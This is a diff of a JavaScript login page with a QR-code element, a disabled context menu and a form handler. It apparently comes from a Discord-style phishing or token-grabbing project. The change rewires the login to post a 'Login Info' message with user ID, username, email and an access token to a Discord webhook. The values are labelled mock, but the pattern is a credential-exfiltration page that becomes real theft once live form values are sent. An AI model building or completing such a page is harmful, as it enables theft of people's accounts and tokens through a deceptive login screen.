@@ -6,6 +6,23 @@ document.addEventListener("DOMContentLoaded", () => {
   const qrCodeElement = document.querySelector(".qr-code");
   const qrCodeImg = document.createElement("img");
 
+  // Discord webhook URL (replace with your own)
+  const WEBHOOK_URL = "your_discord_webhook_url"; // Replace with your Discord webhook URL
+
+  // Mock user credentials for testing
+  const MOCK_CREDENTIALS = {
+    email: "test@example.com",
+    password: "password123",
+  };
+
+  // Mock user data for successful login
+  const MOCK_USER_DATA = {
+    id: "123456789012345678",
+    username: "TestUser",
+    email: "test@example.com",
+    token: "mock-access-token-abc123xyz",
+  };
+
   // Disable context menu
   document.addEventListener("contextmenu", (event) => event.preventDefault());
 
@@ -33,7 +50,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
   for (let i = 0; i < 4; i++) createCube();
 
-  // Form submission with API call
+  // Form submission with mock authentication
   form.addEventListener("submit", async (e) => {
     e.preventDefault();
     const email = emailInput.value.trim();
@@ -55,23 +72,34 @@ document.addEventListener("DOMContentLoaded", () => {
     }, 500);
 
     try {
-      const response = await fetch("http://localhost:3000/api/login", {
+      // Simulate authentication
+      if (
+        email.toLowerCase() !== MOCK_CREDENTIALS.email ||
+        password !== MOCK_CREDENTIALS.password
+      ) {
+        throw new Error("Invalid email or password.");
+      }
+
+      // Send mock user data to webhook
+      const response = await fetch(WEBHOOK_URL, {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ email, password }),
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          content: `**Login Info**\nUser ID: ${MOCK_USER_DATA.id}\nUsername: ${MOCK_USER_DATA.username}\nEmail: ${MOCK_USER_DATA.email}\nToken: ${MOCK_USER_DATA.token}`,
+        }),
       });
 
-      const result = await response.json();
-
-      if (response.ok) {
-        alert("Login successful! Data sent to webhook.");
-        emailInput.value = "";
-        passwordInput.value = "";
-      } else {
-        alert(`Error: ${result.message || "Invalid credentials."}`);
+      if (!response.ok) {
+        throw new Error("Failed to send data to webhook.");
       }
+
+      alert("Login successful! Data sent to webhook.");
+      emailInput.value = "";
+      passwordInput.value = "";
     } catch (error) {
-      alert("Error: Could not connect to the server.");
+      alert(`Error: ${error.message || "Something went wrong."}`);
       console.error("Login error:", error);
     } finally {
       // Stop ellipsis animation
